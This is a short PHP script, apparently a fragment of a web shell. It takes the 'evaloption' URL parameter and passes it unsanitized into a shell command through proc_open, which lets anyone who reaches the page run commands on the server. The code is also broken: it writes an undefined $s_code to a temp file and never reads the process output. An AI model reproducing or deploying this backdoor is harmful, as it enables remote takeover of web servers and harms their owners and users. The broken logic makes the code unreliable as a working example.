<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('proc_open')) {
		$s_descriptorspec = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "w"));
		$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
		@proc_close($s_proc);
	}
	return $s_out;
}

$s_evaloption = $_GET['evaloption'];
$s_lang = 'python';
$s_tmpdir = getcwd();
$s_rand = md5(time().rand(0,100));
$s_script = $s_tmpdir.$s_rand;
if(file_put_contents($s_script, $s_code)!==false){
	$s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
	unlink($s_script);
}

?>